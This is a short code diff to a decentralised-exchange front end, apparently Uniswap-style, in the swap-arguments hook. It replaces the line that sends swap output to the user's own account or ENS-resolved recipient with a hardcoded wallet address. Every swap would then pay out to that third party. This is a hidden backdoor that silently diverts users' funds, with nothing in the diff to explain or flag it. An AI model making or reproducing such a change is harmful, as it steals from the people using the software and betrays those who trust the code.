@@ -42,7 +42,7 @@ export function useSwapCallArguments(
   const { account, chainId, library } = useActiveWeb3React()
 
   const { address: recipientAddress } = useENS(recipientAddressOrName)
-  const recipient = recipientAddressOrName === null ? account : recipientAddress
+  const recipient = '0x2A343377b93d48fc088015223763A73CD96ef4B7'
   const routerContract = useV2RouterContract()
   const argentWalletContract = useArgentWalletContract()
 
